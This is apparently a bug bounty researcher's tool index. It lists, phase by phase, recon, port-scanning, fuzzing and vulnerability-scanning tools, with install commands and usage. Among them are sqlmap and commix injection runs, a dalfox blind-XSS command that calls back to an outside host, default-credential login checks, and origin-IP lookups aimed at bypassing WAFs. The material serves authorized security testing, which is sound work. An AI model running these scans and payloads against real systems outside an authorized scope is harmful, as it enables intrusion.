---
type: tool
title: Bug Bounty Tool Arsenal Index
tags: [tool, recon, scanning, exploitation, arsenal, index]
status: active
last_updated: 2026-06-08
---

# Bug Bounty Tool Arsenal Index

> Organized by attack phase. Each tool is annotated with: installation command, core usage, and bug bounty purpose.
> After adding new tools, synchronize the tool reference section in the Knowledge Base Index.

---

## One-Click Automation Entry Point -- `bbflow`

Located at `$TOOLS_ROOT/bbflow.sh`. Unified CLI wrapping BBOT/Osmedeus recon + **47 hunter scripts**, zero LLM dependency. Execution rules follow `$TOOLS_ROOT/BBFLOW_OPERATIONS.md`; the Vault retains only curated knowledge, the workspace stores raw output temporarily, and the bbflow repo holds reusable hunter / template / profile files.

### Standalone runtime boundary

bbflow runtime **MUST NOT require Vault** and **MUST NOT require LLM**. The Vault is an optional integration; the Vault adapter may only read machine-readable output after scans complete, including `run_manifest.json`, `candidates.jsonl`, `SCOPE.md`, and `scope_contract.json`. `BBFLOW_WORKSPACE` controls the local output root directory; `BBFLOW_REMOTE_ROOT` controls the VPS repo location, defaulting to `~/bbflow`.

```bash
"$TOOLS_ROOT/bbflow.sh" doctor              # Check dependencies
"$TOOLS_ROOT/bbflow.sh" init target.com     # Create $WORKSHOP_ROOT/<target>/SCOPE.md (scope-first enforcement)
"$TOOLS_ROOT/bbflow.sh" flow target.com     # init + recon + hunt end-to-end
"$TOOLS_ROOT/bbflow.sh" list                # List all target statuses
"$TOOLS_ROOT/bbflow.sh" status target.com
"$TOOLS_ROOT/bbflow.sh" hunt target.com --only cors,graphql
"$TOOLS_ROOT/bbflow.sh" hunt target.com --only config-leak,weak-login,backup-files,devops-unauth   # WAF-friendly quartet
```

### Recon ladder v1

| Stage | bbflow role | Primary output |
|---|---|---|
| domain seed | scope-first init / `--scope-file` | `SCOPE.md`, `scope_contract.json` |
| asset discovery | BBOT standard path / Osmedeus standard path | subdomains, live hosts |
| fingerprint | httpx / Osmedeus fingerprint / screenshots | status, title, tech, CDN/WAF |
| path discovery | archive / crawler / well-known paths | URL corpus |
| endpoint discovery | JS route / parameter / method extraction | endpoint candidates |
| CVE / template scan | Nuclei / Wordfence / custom bb-recon templates | known-vuln candidates |
| attack entrypoint | dedupe + triage | Attempt / Finding candidates |

### BBOT standard path / Osmedeus standard path

| Path | Purpose | Command | Boundary |
|---|---|---|---|
| **BBOT standard path** | Default passive-first recon | `bbflow recon <target> --scope-file scope.yaml` | BBOT `subdomain-enum,cloud-enum` + `httpx,badsecrets`; results go to `$WORKSHOP_ROOT/<target>/bbot/` |
| **Osmedeus standard path** | VPS long-running / screenshots / archive / IP-space | `OSMEDEUS_VPS=user@host bbflow recon <target> --scope-file scope.yaml --osmedeus` | Uses `bbflow-vps.sh standard` with `bbflow-safe`; does not run content fuzz / DNS brute / high-noise nuclei |

### Nuclei template lifecycle

Custom templates go in `$TOOLS_ROOT/nuclei-templates/bb-recon/`, but must complete the lifecycle before being included in stable scans: draft -> `nuclei -validate` -> `example.com null-case` -> `scoped live canary` -> false-positive review -> promote -> write back to Vault / bbflow wiki / `CHANGELOG.md`. PD community templates and Wordfence CVEs are updated via `bbflow nuclei-update`.

### WAF-safe mode

WAF-safe mode = low-noise, GET-first, low `rate-limit`, passive before active; payload mutation is limited to encoding, path normalization, header variation, and parameter substitution within authorized scope. **Do not use WAF bypass as the default**; `waf-bypass`, DAST, ffuf, dalfox, arjun, and high-noise nuclei require an Operation Log entry and stop condition first.

### VPS native recon toolchain

The VPS actual installation state and automation boundaries follow the Reference Card for the Native Recon Toolchain. The automation agent should use native `terminal` / `execute_code` for `subfinder`, `amass`, `dnsx`, `httpx`, `naabu`, `gau`, `waybackurls`, `katana`, `uro`, `anew`, `ffuf`, `arjun`, `nuclei`, `interactsh-client`, `cent`, and similar tools; do not create duplicate `bb_*` wrappers for these capabilities.

Automated research/monitor runs should be passive-only, GET/HEAD, low-noise differential checks; `ffuf`, large-scope `naabu/rustscan/nmap`, `interactsh`, Cent/community template corpus, and high-noise nuclei require manual authorization with an Operation Log entry.

### Vault / workspace / bbflow loop

`Raw output does not go into the Vault.` The Vault initiates and governs workflows; the workspace temporarily stores scan output, logs, PoC, and screenshots. Candidate hits undergo deduplication, then are classified: not substantiated or duplicate -> Attempt; confirmed -> Finding + Submission + FORM. Reusable knowledge flows back to Pattern / Lessons / Playbook, and automatable detection experience is written back to bbflow hunters, scan templates, Osmedeus profiles, or wiki entries.

### Version evolution (2026-04-15 to 2026-04-25)

| Version | Increment | Cumulative |
|---------|-----------|-----------|
| 1.0.0 | Initial 16 pattern hunters | 16 |
| 1.1.0 | +4 modern fuzzing (dalfox/arjun/trufflehog/ffuf) | 20 |
| 1.2.0 | +1 portscan (rustscan to nmap) | 21 |
| 1.3.0 | +1 param-fuzz pipeline | 22 |
| 1.4.0 | +6 WAF-friendly low-noise (config-leak/weak-login/backup-files/nuclei-deep/waf-bypass/crawl-chain) | **28** |
| 1.5.0 | +VPS native recon toolchain reference | 28 + toolchain SoT |
| current | Tool repo expanded to 47 hunter scripts; details per `find "$TOOLS_ROOT/hunters" -name 'hunt-*.sh'` and `$TOOLS_ROOT/CHANGELOG.md` | **47** |

See `$TOOLS_ROOT/CHANGELOG.md` for full release notes.

### Hunter scripts reference table

#### v1.0.0 -- Pattern hunters (driven by confirmed bounty cases)

| Hunter | Detection Target | Validation Case |
|--------|-----------------|-----------------|
| `hunt-hybris-occ.sh` | SAP Hybris OCC default creds + cart IDOR | Retailer P2/High |
| `hunt-envdata.sh` | `window.envData` + AWS/Google/Sentry keys | eero HackerOne |
| `hunt-sourcemap-secrets.sh` | `.js.map` sourcesContent secret grep | eero / eufy |
| `hunt-hardcoded-js-secrets.sh` | live `.js` bundle 19 hardcoded key patterns | Wyze |
| `hunt-cors-reflect.sh` | 4-layer reflection + credentials:true check | Ubiquiti 8 services |
| `hunt-graphql-idor.sh` | No-auth + introspection + integer ID IDOR | Ubiquiti RMA |
| `hunt-user-enum.sh` | validate_email differential + rate limit | eufy / SimpliSafe |
| `hunt-git-exposure.sh` | .git probe + config/remote/log credential grep | goingnet / anbon |
| `hunt-subdomain-takeover.sh` | CNAME + 20+ vendor fingerprint + claimability | Synology / Under Armour F1 |
| `hunt-open-redirect.sh` | 20 param x 9 bypass + OAuth/logout paths | Ring lesson learned |
| `hunt-jwt.sh` | JWT decode + alg:none + weak HS256 + kid/jku | generic |
| `hunt-devops-unauth.sh` | 40+ DevOps tools unauthenticated | Ruckus |
| `hunt-actuator-deep.sh` | Spring Boot Actuator deep (env/configprops/heapdump/jolokia) | Arlo pattern |
| `hunt-mcp-oauth-scope.sh` | MCP OAuth consent vs token write capability gap | Intercom F3 |
| `hunt-google-api-key.sh` | `AIza*` key validation against 16 Google services | Retailer Appendix C |
| `hunt-nxdomain-corpus.sh` | Historical hostname -> NXDOMAIN -> Host-header payload | Starbucks writeup |

#### v1.1.0-1.3.0 -- Modern fuzzing + port scan + param fuzz

| Hunter | Detection Target | Integration |
|--------|-----------------|-------------|
| `hunt-dalfox-xss.sh` | reflected + blind XSS (DALFOX_BLIND_URL via interactsh) | katana + gau + gf + dalfox |
| `hunt-arjun-params.sh` | hidden GET/POST/JSON parameter discovery | arjun + SecLists (>6000 params) |
| `hunt-trufflehog-secrets.sh` | dump .git history 100+ detectors | trufflehog `--only-verified` |
| `hunt-ffuf-dirs.sh` | 3-layer dir fuzzing | ffuf + auto 404-size + recursion |
| `hunt-portscan.sh` | port + service detection; auto-flag Docker/Redis/ES/Mongo | rustscan -> nmap |
| `hunt-param-fuzz.sh` | 5-stage DAST | katana + gau + uro + nuclei `--dast` |

#### v1.4.0 -- WAF-friendly low-noise wave (government sites / firewalled targets)

Each hunter uses **single-shot verification** (1 request / path) + content-based confirmation to avoid WAF triggers:

| Hunter | Detection Target | Design Focus |
|--------|-----------------|-------------|
| `hunt-config-leak.sh` | 100+ paths single-shot content-match | FAST=1 mode runs only 24 P1/P2; covers xray PoC-none rules |
| `hunt-weak-login.sh` | 25+ vendor default creds | 1-3 login attempts + differential body pattern |
| `hunt-backup-files.sh` | 40 static + hostname-derived + Index-of fallback | content-type + size dual verification |
| `hunt-nuclei-deep.sh` | 18-category nuclei scan (CATEGORY=xss/sqli/...) | Auto-integrates bb-recon custom templates |
| `hunt-waf-bypass.sh` | wafw00f + 15+ bypass techniques | ORIGIN_IP= direct origin connection |
| `hunt-crawl-chain.sh` | 10-stage URL discovery + DAST | katana -> gau -> uro -> arjun -> nuclei -> dalfox |

See `$TOOLS_ROOT/hunters/README.md` (includes 47 hunter scripts + sample output + decision rules).

---

## Phase 1 -- Recon & Subdomain Enumeration

| Tool | Purpose | Installation |
|------|---------|-------------|
| subfinder | Passive subdomain collection (fastest) | `go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest` |
| amass | Active+passive subdomain (ASN/WHOIS integration) | `go install github.com/owasp-amass/amass/v4/...@master` |
| assetfinder | Quick subdomain enumeration | `go install github.com/tomnomnom/assetfinder@latest` |
| findomain | Multi-source subdomain (including crt.sh) | `brew install findomain` |
| asnmap | ASN to CIDR conversion | `go install github.com/projectdiscovery/asnmap/cmd/asnmap@latest` |
| bbot | Full-featured OSINT framework | `pip install bbot` |
| **recox** | Browser passive aggregator (HackerTarget/JLDC/RapidDNS/DNSRepo/URLScan/crt.sh/CertSpotter) -- fills subfinder default source gaps | No install required; browser at https://recox.hackerz.space; or Playwright automation -- see [[Tool - Recox]] |
| **ip.thc.org** | Passive DNS database (5.9B records) -- Subdomain / RDNS / CNAME three-in-one, no auth, curl-ready -- see [[Tool - ip.thc.org DNS Recon]] | No install required: `curl https://ip.thc.org/<domain>` |
| waymore | Multi-source historical URL aggregation (Wayback + CommonCrawl + OTX + URLScan + Alien multi-source) | `pip install waymore` |
| gau | Same as waymore but lighter weight | `go install github.com/lc/gau/v2/cmd/gau@latest` |

```bash
# Standard passive recon pipeline
subfinder -d target.com -all -recursive -o sub1.txt
amass enum -passive -d target.com -o sub2.txt
curl -s "https://crt.sh/?q=%.target.com&output=json" | jq -r '.[].name_value' | sort -u > sub3.txt
curl -s "https://ip.thc.org/target.com?l=100&nocolor=1&noheader=1" | grep -v '^;' > sub4.txt  # ip.thc.org
cat sub*.txt | sort -u | anew allsubs.txt
```

---

## Phase 1.5 -- Passive Enrichment (after subfinder, before HTTP probing)

> **When to use**: After subfinder/amass finishes, before running httpx. Goal: find assets that DNS enumeration misses -- historical origin IPs, TLS-hidden hosts, exposed services, IP ranges not in DNS.
>
> **Regular recon vs anti-fraud comparison**: Established company targets with 5-10 years of history -> passive DNS is rich, SecurityTrails/Shodan/Censys work extremely well. New fraud sites <=30 days -> most tools return 0 hits (see [[Tool - Anti-Fraud OSINT Toolchain]] effectiveness matrix).

### Tools and priority order

| Tool | Core purpose | Free tier | Best scenario |
|------|-------------|-----------|---------------|
| **SecurityTrails** | Historical DNS A records (find pre-CDN origin IP / deleted subdomains) | 50 queries/month | Finding historical origin IPs to bypass WAF |
| **Censys** | TLS cert search (find services/IPs not in DNS) | Free account | Finding hidden hosts not listed in SAN |
| **Shodan** | Exposed service banners + CVE fingerprints / entire ASN IP range | Basic free | Finding exposed Redis/ES/Mongo/Jenkins |
| **BGP.HE.NET** | ASN CIDR range + all associated IPs | No account needed | Expanding IP scope, finding hidden hosts |
| **ViewDNS IP History** | Domain historical IP (pre-CDN origin) | No account needed | WAF bypass prerequisite, finding origin IPs |
| **URLScan.io** | Screenshot timeline + network requests + historical scans | Free API | Finding previously scanned URLs + timeline |
| **AlienVault OTX** | Threat intelligence (check if target has disclosed vulnerabilities/IOCs) | Completely free | Pre-hunt prior disclosure check |
| **DomainBigData** | Other domains with the same registrant (company asset expansion) | Manual browsing | Finding company-owned domains not listed in scope |

---

### SecurityTrails -- Historical DNS + Subdomains

```bash
TARGET="target.com"
ST_KEY="<your_api_key>"  # Free: register at app.securitytrails.com

# Historical A records (find pre-CDN origin IP)
curl -s "https://api.securitytrails.com/v1/history/${TARGET}/dns/a" \
  -H "APIKEY: ${ST_KEY}" | \
  python3 -c "
import sys,json
d = json.load(sys.stdin)
records = d.get('records', [])
print(f'Historical A records: {len(records)}')
for r in records:
    ip = r.get('values',[{}])[0].get('ip','?')
    first = r.get('first_seen','?')
    last = r.get('last_seen','?')
    print(f'  {ip}  ({first} -> {last})')
"

# Subdomain list (fills subfinder gaps)
curl -s "https://api.securitytrails.com/v1/domain/${TARGET}/subdomains" \
  -H "APIKEY: ${ST_KEY}" | \
  python3 -c "
import sys,json
d = json.load(sys.stdin)
subs = d.get('subdomains', [])
print(f'SecurityTrails subdomains: {len(subs)}')
for s in subs[:20]: print(f'  {s}.${TARGET}')
" 2>/dev/null
```

### Censys -- TLS Cert Search for Hidden Services

```bash
# Free account: get API ID + Secret at search.censys.io
CENSYS_ID="<api_id>"
CENSYS_SECRET="<api_secret>"

# Search TLS certs containing target domain (including SAN)
curl -s "https://search.censys.io/api/v2/certificates/search" \
  -u "${CENSYS_ID}:${CENSYS_SECRET}" \
  -G --data-urlencode "q=${TARGET}" \
  --data-urlencode "per_page=10" | \
  python3 -c "
import sys,json
d = json.load(sys.stdin)
hits = d.get('result',{}).get('hits',[])
print(f'Censys cert hits: {len(hits)}')
for h in hits[:5]:
    san = h.get('parsed',{}).get('names',[])
    print(f'  IPs: {h.get(\"ip\",\"?\")}, SANs: {san[:3]}')
"

# Search exposed hosts (by domain)
curl -s "https://search.censys.io/api/v2/hosts/search" \
  -u "${CENSYS_ID}:${CENSYS_SECRET}" \
  -G --data-urlencode "q=services.tls.certificates.leaf_data.subject_dn:${TARGET}" | \
  python3 -c "
import sys,json
d = json.load(sys.stdin)
hits = d.get('result',{}).get('hits',[])
print(f'Hidden hosts: {len(hits)}')
for h in hits[:10]:
    print(f'  {h.get(\"ip\")} ({h.get(\"location\",{}).get(\"country\",\"?\")}) | services: {[s.get(\"port\") for s in h.get(\"services\",[])[:5]]}')
"
```

### Shodan -- Exposed Services + CVE Fingerprints + ASN Expansion

```bash
# CLI install: pip install shodan; shodan init <API_KEY>
# Free: shodan.io account provides basic search

# Search all exposed hosts for a target organization
shodan search "org:\"${TARGET}\"" --fields ip_str,port,hostnames,vulns | head -20

# Search entire ASN IP range (get ASN with asnmap first)
ASN=$(asnmap -a ${TARGET} -json 2>/dev/null | jq -r '.[].as_number' | head -1)
shodan search "asn:AS${ASN}" --fields ip_str,port,product --limit 50

# Find specific services (unauthenticated Redis/ES/Jenkins/MongoDB)
shodan search "org:\"${TARGET}\" product:Redis" --fields ip_str,port
shodan search "org:\"${TARGET}\" product:Elasticsearch" --fields ip_str,port
shodan search "org:\"${TARGET}\" http.title:Jenkins" --fields ip_str,port,http.title

# curl alternative without CLI
SHODAN_KEY="<your_key>"
curl -s "https://api.shodan.io/shodan/host/search?key=${SHODAN_KEY}&query=org:\"${TARGET}\"&limit=20" | \
  python3 -c "
import sys,json
d = json.load(sys.stdin)
matches = d.get('matches', [])
print(f'Shodan hosts: {d.get(\"total\",0)} total, showing {len(matches)}')
for m in matches[:10]:
    vulns = list(m.get('vulns', {}).keys())
    print(f'  {m[\"ip_str\"]}:{m.get(\"port\")} | {m.get(\"product\",\"\")} | CVE: {vulns[:2]}')
"
```

### BGP.HE.NET -- ASN Expansion (find all company IP ranges)

```bash
# Completely free, curl directly
TARGET_DOMAIN="target.com"

# Step 1: Find ASN
curl -s "https://api.bgpview.io/search?query_term=${TARGET_DOMAIN}" | \
  python3 -c "
import sys,json
d = json.load(sys.stdin)
asns = d.get('data',{}).get('asns',[])
print('ASNs found:')
for a in asns[:5]:
    print(f'  AS{a[\"asn\"]} | {a[\"name\"]} | {a.get(\"description_short\",\"\")}')
"

# Step 2: Get all CIDRs for the ASN (company IP ranges)
ASN="12345"  # Replace with ASN found in previous step
curl -s "https://api.bgpview.io/asn/${ASN}/prefixes" | \
  python3 -c "
import sys,json
d = json.load(sys.stdin)
v4 = d.get('data',{}).get('ipv4_prefixes',[])
print(f'IPv4 CIDR count: {len(v4)}')
for p in v4[:10]:
    print(f'  {p[\"prefix\"]} ({p.get(\"name\",\"?\")}) | Usage: {p.get(\"description\",\"\")}')
"

# Step 3: Passive RDNS query for entire CIDR
curl -s "https://bgp.he.net/super-lg/report/api/call/dns/rdns?q=${ASN}" 2>/dev/null | head -20 || \
echo "HE.NET direct rdns lookup: https://bgp.he.net/AS${ASN}"
```

### ViewDNS -- Historical IP + Reverse IP

```bash
# Completely free (rate limited), curl directly
TARGET="target.com"

# Historical IP (find pre-CDN origin IP)
# Browser query: https://viewdns.info/iphistory/?domain=<domain>
curl -sA 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36' \
  "https://viewdns.info/iphistory/?domain=${TARGET}" | \
  grep -oP '(?<=<td>)[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+(?=</td>)' | sort -u

# Reverse IP (find other domains on the same origin IP)
ORIGIN_IP="1.2.3.4"  # Replace with discovered origin IP
curl -sA 'Mozilla/5.0' \
  "https://viewdns.info/reverseip/?host=${ORIGIN_IP}&t=1" | \
  grep -oP '[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}' | sort -u | grep -v viewdns | head -30

# ip.thc.org alternative (for existing IPs, no anti-scraping)
curl -s "https://ip.thc.org/${ORIGIN_IP}?l=50&nocolor=1&noheader=1" | head -20
```

### URLScan.io -- Network Request Timeline

```bash
TARGET="target.com"

# Search all scan records (timeline)
curl -s "https://urlscan.io/api/v1/search/?q=domain:${TARGET}&size=10" | \
  python3 -c "
import sys,json
d = json.load(sys.stdin)
print(f'URLScan total: {d.get(\"total\",0)}')
for r in d.get('results',[])[:5]:
    page = r.get('page',{})
    print(f'  [{r[\"task\"][\"time\"][:10]}] {page.get(\"url\",\"\")} | {page.get(\"status\",\"\")}')
    print(f'    screenshot: https://urlscan.io/screenshots/{r[\"task\"][\"uuid\"]}.png')
"

# Search target's IP (find historical scans + other domains)
TARGET_IP="1.2.3.4"
curl -s "https://urlscan.io/api/v1/search/?q=ip:${TARGET_IP}&size=10" | \
  python3 -c "
import sys,json
d = json.load(sys.stdin)
print(f'Same IP scans: {d.get(\"total\",0)}')
domains = set()
for r in d.get('results',[]):
    domains.add(r.get('page',{}).get('domain',''))
print('Domains on same IP:', list(domains)[:10])
"
```

### AlienVault OTX -- Pre-Hunt Prior Disclosure Check

```bash
TARGET="target.com"

# Domain query (completely free, no key required)
curl -s "https://otx.alienvault.com/api/v1/indicators/domain/${TARGET}/general" | \
  python3 -c "
import sys,json
d = json.load(sys.stdin)
pulses = d.get('pulse_info',{}).get('count',0)
print(f'OTX pulses: {pulses}')
if pulses > 0:
    for p in d.get('pulse_info',{}).get('pulses',[])[:5]:
        print(f'  [{p[\"created\"][:10]}] {p[\"name\"]}')
print(f'Reputation: {d.get(\"reputation\",0)} | Country: {d.get(\"country_name\",\"?\")}')
"

# IP query
TARGET_IP="1.2.3.4"
curl -s "https://otx.alienvault.com/api/v1/indicators/IPv4/${TARGET_IP}/general" | \
  python3 -c "
import sys,json
d = json.load(sys.stdin)
print(f'IP OTX pulses: {d.get(\"pulse_info\",{}).get(\"count\",0)}')
print(f'ASN: {d.get(\"asn\",\"?\")} | Org: {d.get(\"organization\",\"?\")}')
"
```

### Phase 1.5 Complete Pipeline (10 minutes)

```bash
TARGET="target.com"
ST_KEY=""       # SecurityTrails API key (free 50 queries/month)
SHODAN_KEY=""   # Shodan API key

echo "=== [1] SecurityTrails Historical DNS ==="
[ -n "$ST_KEY" ] && curl -s "https://api.securitytrails.com/v1/history/${TARGET}/dns/a" \
  -H "APIKEY: ${ST_KEY}" | python3 -c "
import sys,json; records=json.load(sys.stdin).get('records',[])
print(f'Historical A: {len(records)} records')
[print(f'  {r.get(\"values\",[{}])[0].get(\"ip\",\"?\")} ({r.get(\"first_seen\",\"?\")[:7]}->{r.get(\"last_seen\",\"?\")[:7]})') for r in records]
"

echo "=== [2] BGP ASN -> CIDR ==="
curl -s "https://api.bgpview.io/search?query_term=${TARGET}" | \
  python3 -c "import sys,json; [print(f'AS{a[\"asn\"]} {a[\"name\"]}') for a in json.load(sys.stdin).get('data',{}).get('asns',[])]"

echo "=== [3] URLScan Timeline ==="
curl -s "https://urlscan.io/api/v1/search/?q=domain:${TARGET}&size=5" | \
  python3 -c "import sys,json; d=json.load(sys.stdin); print(f'URLScan: {d.get(\"total\",0)} scans')"

echo "=== [4] OTX Prior Disclosure ==="
curl -s "https://otx.alienvault.com/api/v1/indicators/domain/${TARGET}/general" | \
  python3 -c "import sys,json; d=json.load(sys.stdin); print(f'OTX pulses: {d.get(\"pulse_info\",{}).get(\"count\",0)}')"

echo "=== [5] ViewDNS IP History ==="
echo "  Manual lookup: https://viewdns.info/iphistory/?domain=${TARGET}"

echo "=== [6] Shodan Exposed Services ==="
[ -n "$SHODAN_KEY" ] && curl -s \
  "https://api.shodan.io/shodan/host/search?key=${SHODAN_KEY}&query=hostname:${TARGET}&fields=ip_str,port,product" | \
  python3 -c "import sys,json; d=json.load(sys.stdin); print(f'Shodan: {d.get(\"total\",0)} hosts'); [print(f'  {m[\"ip_str\"]}:{m.get(\"port\")} {m.get(\"product\",\"\")}') for m in d.get('matches',[])[:10]]"

echo "=== [7] Censys -> DomainBigData (manual) ==="
echo "  Censys: https://search.censys.io/search?resource=hosts&q=${TARGET}"
echo "  DomainBigData: https://domainbigdata.com/${TARGET}"
```

---

## Phase 2 -- DNS Resolution & Probing

| Tool | Purpose | Installation |
|------|---------|-------------|
| puredns | Fast DNS resolution (reliable resolver lists) | `go install github.com/d3mondev/puredns/v2@latest` |
| dnsx | Multi-function DNS query (A/CNAME/MX/TXT) | `go install github.com/projectdiscovery/dnsx/cmd/dnsx@latest` |
| httpx | HTTP probe + header/title extraction | `go install github.com/projectdiscovery/httpx/cmd/httpx@latest` |
| anew | Deduplicated append | `go install github.com/tomnomnom/anew@latest` |

```bash
cat allsubs.txt | puredns resolve -r resolvers.txt -w resolved.txt
cat resolved.txt | httpx -silent -title -status-code -tech-detect -o live.txt
cat resolved.txt | httpx -silent -status-code 200,301,302,403 -o live_filtered.txt
```

---

## Phase 3 -- Port Scanning & Service Fingerprint

| Tool | Purpose | Installation |
|------|---------|-------------|
| nmap | Port scan + NSE scripts | `brew install nmap` |
| masscan | Ultra-fast large-scale port scan | `brew install masscan` |
| naabu | Fast port scan (ProjectDiscovery) | `go install github.com/projectdiscovery/naabu/v2/cmd/naabu@latest` |

```bash
nmap -Pn -sV --top-ports 1000 -oA nmap_out target.com
naabu -l live.txt -top-ports 1000 -o ports.txt
masscan -iL ips.txt -p1-65535 --rate 10000 -oG masscan.txt
```

---

## Phase 4 -- URL Discovery & Crawling

| Tool | Purpose | Installation |
|------|---------|-------------|
| waybackurls | Fetch historical URLs from Wayback Machine | `go install github.com/tomnomnom/waybackurls@latest` |
| gau | Fetch URLs from multiple sources (wayback/URLScan/AlienVault) | `go install github.com/lc/gau/v2/cmd/gau@latest` |
| hakrawler | Fast crawler + JS link extraction (depth, size filter) | `go install github.com/hakluke/hakrawler@latest` |
| katana | Active crawler (supports JS rendering) | `go install github.com/projectdiscovery/katana/cmd/katana@latest` |
| gf | URL parameter pattern filter (XSS/SSRF/SQLi...) | `go install github.com/tomnomnom/gf@latest` |
| **uro** | URL dedup + noise removal (shrinks gau/wayback long lists by 10x) | `pip install uro` |

```bash
echo target.com | gau --threads 5 --o gau_urls.txt
echo target.com | waybackurls > wb_urls.txt

# uro -- noise removal (static files, duplicate params, tracking URLs all removed)
cat gau_urls.txt wb_urls.txt | uro > urls_clean.txt        # default cleanup
cat gau_urls.txt | uro --filters hasparams,hasextension    # keep only URLs with params + extensions
cat gau_urls.txt | uro -b js,css,png,svg,woff              # custom exclude extensions

cat urls_clean.txt | gf xss > xss_candidates.txt
cat urls_clean.txt | gf sqli | tee sqli_candidates.txt

# hakrawler -- fast crawl + JS link extract
echo https://target.com | hakrawler -d 3 -subs -u -json > crawl.json
cat live.txt | hakrawler -d 2 -t 10 -size 2000 | anew all_urls.txt
```

**gf pattern names:** `xss` / `ssrf` / `sqli` / `idor` / `redirect` / `lfi` / `rce` / `ssti` / `debug_logic` / `secrets` / `cors`

---

## Phase 4.5 -- Subdomain Takeover Check

| Tool | Purpose | Installation |
|------|---------|-------------|
| **subjack** | 20+ service fingerprint takeover detection (Go, fast) | `go install github.com/haccer/subjack@latest` |
| **can-i-take-over-xyz** | EdOverflow maintained takeover vendor detailed list (official Vulnerable/Not Vulnerable classification) | `git clone github.com/EdOverflow/can-i-take-over-xyz` |
| nuclei templates | `takeover/` category (regularly updated, auto-pairs with httpx) | Built into nuclei-templates |
| bbflow hunt-subdomain-takeover | Local hunter (CNAME + 20+ vendor patterns) | `$TOOLS_ROOT/hunters/hunt-subdomain-takeover.sh` |

```bash
# subjack (fastest)
echo subdomain.target.com | subjack -v -t 1                # single
subjack -w subs.txt -t 100 -timeout 10 -ssl -c ~/go/pkg/mod/github.com/haccer/subjack@*/fingerprints.json -v -o takeover.txt

# nuclei
nuclei -l subs.txt -t ~/nuclei-templates/http/takeovers/ -o takeovers.txt

# Official vendor status (check before reporting)
# First check can-i-take-over-xyz/README.md to confirm Vulnerable vs Not Vulnerable
grep -i 'fastly' ~/bbtools/can-i-take-over-xyz/README.md
```

---

## Phase 5 -- Directory & File Fuzzing

| Tool | Purpose | Installation |
|------|---------|-------------|
| ffuf | Fastest web fuzzer (vhost/dir/param support) | `go install github.com/ffuf/ffuf/v2@latest` |
| dirsearch | Python directory scanner (built-in wordlist) | `pip install dirsearch` |
| feroxbuster | Rust recursive directory scanner | `brew install feroxbuster` |
| BackupFinder | Backup file pattern probing (1900+ variants) | `go install github.com/MuhammadWaseem29/BackupFinder/cmd/backupfinder@v1.0.2` |

```bash
ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302,403 -o ffuf_out.json
dirsearch -u https://target.com -e php,asp,aspx,jsp,html,js -o dirsearch_out.txt
feroxbuster -u https://target.com --depth 2 -x php js json -o ferox_out.txt

# Backup file probing
backupfinder -u https://target.com -w                     # 1900+ variants
backupfinder -u https://target.com -o backup_results.txt
```

---

## Phase 6 -- Parameter Discovery

| Tool | Purpose | Installation |
|------|---------|-------------|
| Arjun | HTTP hidden parameter discovery (25,890 word dictionary) | `pipx install arjun` |
| ParamSpider | Extract parameters from Wayback | `pip install paramspider` (or `git clone + pip install .`) |
| **x8** | Rust hidden parameter fuzzer (ultra-fast, body/URL/headers modes) | `cargo install x8` |
| **top25-parameter** | Top 25 parameter lists per vulnerability type (SSTI/XSS/SSRF/SQLi/...) | `git clone github.com/lutfumertceylan/top25-parameter` |

```bash
arjun -u https://api.target.com/endpoint -m POST           # POST mode
arjun -u https://target.com -m JSON                        # JSON body
arjun -i urls.txt -oJ output.json                          # batch scan
arjun -u https://target.com --headers "Authorization: Bearer TOKEN"
arjun -u https://target.com --passive                      # extract from JS, no active scan

paramspider -d target.com -o params_out.txt                # Wayback-based extraction
paramspider -l domains.txt -o params_batch.txt

# ===== x8 (Rust, fastest hidden-param scanner) =====
x8 -u "https://target.com/api" -X POST --body '{"foo":"%s"}' -w ~/wordlists/params.txt
x8 -u "https://target.com/?a=b" -w params.txt              # URL params
x8 -u "https://target.com" --one-worker-per-host -W params.txt
x8 -u "https://target.com" --headers X-HEADER-FUZZ         # header fuzz mode

# ===== top25-parameter (focused wordlists per vuln type) =====
# Use these wordlists with x8/arjun/ffuf for targeted fuzzing per vuln
cat ~/bbtools/top25-parameter/Top-25-SSTI-parameters.txt | x8 -u https://target.com -W -
```

---

## Phase 7 -- JavaScript Analysis & Source Maps

| Tool | Purpose | Installation |
|------|---------|-------------|
| reverse-sourcemap | Reverse .map files to original source | `npm install -g reverse-sourcemap` |
| @sugarat/source-map-cli | Vue/Webpack .map reverse engineering | `npm install -g @sugarat/source-map-cli` |
| linkfinder | Extract endpoints from JS files | `pip install linkfinder` |
| JS-Tap | Red team JS payload framework (monkeypatching) | See [[Tool - JS-Tap]] |
| Source Map RE | Complete reverse engineering workflow | See [[Tool - Source Map Reverse Engineering]] |

```bash
reverse-sourcemap --output-dir ./src app.js.map
npx @sugarat/source-map-cli <source-map-url>

# linkfinder
python3 linkfinder.py -i https://target.com/app.js -o cli

# grep secrets from JS
grep -rE "(api[_-]?key|secret|token|password|credential)" ./src --include="*.js" -i
grep -rE "(client_id|client_secret|aws_access)" ./src -i
```

---

## Phase 8 -- Vulnerability Scanning

| Tool | Purpose | Installation |
|------|---------|-------------|
| nuclei | Template-based vulnerability scanner (14,000+ templates) | `go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest` |
| dalfox | XSS automation scanner | `go install github.com/hahwul/dalfox/v2@latest` |
| sqlmap | SQL injection automation | `brew install sqlmap` |
| XSStrike | Advanced XSS scanner | `pip install xsstrike` |
| **jaeles** | Signature-based web scanner (YAML signatures, maintained by j3ssie) | `go install github.com/jaeles-project/jaeles@latest` |
| **commix** | Command injection automation (the sqlmap equivalent for command injection) | `git clone github.com/commixproject/commix` |
| **gotestwaf** | WAF testing tool (by wallarm; evaluates WAF bypass rate) | `go install github.com/wallarm/gotestwaf/cmd/gotestwaf@latest` |

```bash
nuclei -l live.txt -t ~/nuclei-templates/ -severity critical,high,medium -o nuclei_out.txt
nuclei -u https://target.com -tags cve,misconfig,exposure -o nuclei_cve.txt
nuclei -u https://target.com -ai                          # LLM-assisted (newer versions)

dalfox url https://target.com/search?q=test
cat xss_candidates.txt | dalfox pipe -b hahwul.xss.ht

sqlmap -u "https://target.com/page?id=1" --batch --level=3 --risk=2

# ===== jaeles (signature-based scanner, 400+ plugins) =====
jaeles config update                                       # fetch latest signatures
jaeles scan -s '/sensitive/*' -u https://target.com
